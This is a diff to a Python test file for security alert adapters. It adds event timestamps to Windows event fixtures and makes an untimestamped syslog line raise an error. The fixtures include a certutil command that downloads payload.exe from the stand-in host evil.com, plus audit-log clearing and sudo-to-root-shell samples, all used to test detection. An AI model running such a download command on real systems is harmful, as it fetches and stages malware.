@@ -235,7 +235,7 @@ class TestAlertAdapters:
         # 4688 Process Creation
         ev4688 = {
             "Event": {
-                "System": {"EventID": 4688, "Computer": "SRV-01"},
+                "System": {"EventID": 4688, "Computer": "SRV-01", "TimeCreated": {"@SystemTime": "2026-11-07T09:00:00Z"}},
                 "EventData": {
                     "NewProcessName": "C:\\Windows\\System32\\certutil.exe",
                     "CommandLine": "certutil.exe -urlcache -split -f http://evil.com/payload.exe",
@@ -251,7 +251,7 @@ class TestAlertAdapters:
         # 1102 Audit Log Cleared
         ev1102 = {
             "Event": {
-                "System": {"EventID": 1102, "Computer": "SRV-01"},
+                "System": {"EventID": 1102, "Computer": "SRV-01", "TimeCreated": {"@SystemTime": "2026-11-07T09:00:00Z"}},
                 "EventData": {"SubjectUserName": "attacker"},
             }
         }
@@ -282,7 +282,11 @@ class TestAlertAdapters:
         adapter = LinuxAuthAdapter()
         line = "Oct 31 09:12:00 webserver sudo:   jsmith : TTY=pts/0 ; PWD=/home/jsmith ; USER=root ; COMMAND=/bin/bash"
         assert adapter.can_adapt(line) is True
-        alert = adapter.adapt(line)
+        # A bare syslog line carries no year, so no usable event time: it is refused rather than stamped with "now" (F1).
+        from app.modules.alerts.adapter_protocol import AlertTimestampError
+        with pytest.raises(AlertTimestampError):
+            adapter.adapt(line)
+        alert = adapter.adapt({"message": line, "timestamp": "2026-10-31T09:12:00Z"})
         assert alert.category == "privilege_escalation"
         assert alert.mitre_attack[0].technique_id == "T1548.003"
 
